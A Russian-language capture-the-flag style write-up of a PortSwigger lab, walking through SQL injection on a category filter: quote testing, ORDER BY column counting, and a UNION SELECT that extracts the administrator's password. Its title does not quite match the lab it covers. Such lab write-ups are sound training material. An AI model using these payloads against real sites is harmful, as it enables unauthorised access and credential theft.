---
title: "SQL injection UNION attack, finding a column containing text"
date: 2025-06-19
tags: [sql, writeup]
---

**Source:** [Coffee Cube](https://t.me/coffee_cube)  
**Lab:** [PortSwigger](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-using-a-sql-injection-union-attack-to-retrieve-interesting-data/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)


## Scope

```
https://0afe00cb0435e68b8132b15500ae0073.web-security-academy.net/
```

В данной лабе есть уязвимый к **SQL injection** фильтр категории. В БД есть таблицы с именам `users` и колонками `username` и `password`. Нужно получить информацию из БД, чтобы зайти в аккаунт `administrator`.


## Solution

Известно, что уязвимость находится в фильтре категорий, поэтому сразу возьму его.

```
https://0afe00cb0435e68b8132b15500ae0073.web-security-academy.net/filter?category=Pets
```

Нужно подобрать обрамление. Пусть запрос выглядит следующим образом:

```sql
SELECT * FROM table WHERE category = 'Pets'
```

Протестирую пейлоад:

```
Pets' and 0=1-- -
```

![IMG](/assets/images/IMG_SQLinjection-UNION-attack-retrieving-data-from-other-tables/1.png){: height="200" .align-center}

Страница пустая, значит для обрамления используются одинарные кавычки. Теперь узнаю количество полей в запросе с помощью `ORDER BY`:

```
Pets' ORDER BY 10-- -Error
Pets' ORDER BY 5-- -Error
Pets' ORDER BY 3-- -Error
Pets' ORDER BY 2-- -Ok
```

Значит в запросе 2 параметра. Использую `UNION`, чтобы отобразить данные:

```
Pets' and false UNION SELECT NULL, NULL-- -Ok
Pets' and false UNION SELECT 1, 2-- -Error
Pets' and false UNION SELECT '1', '2'-- -Ok
```

Теперь попробую добавить поля `username` и `password`:

```
Pets' and false UNION SELECT username, password FROM users WHERE username = 'administrator'-- -ok
```

![IMG](/assets/images/IMG_SQLinjection-UNION-attack-retrieving-data-from-other-tables/2.png){: height="200" .align-center}

Получил креды: `administrator`:`5j1o1b7ls5ltyvanoo42`. Зайду в аккаунт: 

![IMG](/assets/images/IMG_SQLinjection-UNION-attack-retrieving-data-from-other-tables/3.png){: height="200" .align-center}

Ну, все. Я получил власть...
